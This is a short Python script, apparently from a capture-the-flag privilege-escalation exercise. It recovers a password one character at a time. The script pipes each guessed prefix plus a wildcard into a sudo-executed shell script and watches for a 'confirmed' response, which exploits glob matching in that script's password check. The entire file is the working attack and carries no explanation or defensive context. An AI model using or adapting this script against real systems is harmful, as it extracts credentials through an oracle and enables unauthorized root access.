import string
import subprocess

charset = string.ascii_letters + string.digits
password = ""

while True:
    for char in charset:
        command = f"echo '{password}{char}*'|sudo /abc/def/xyz.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
        if "confirmed" in output:
            password += char
            print("\r"+password, flush=True, end='')
            break
    else:
        print()
        break
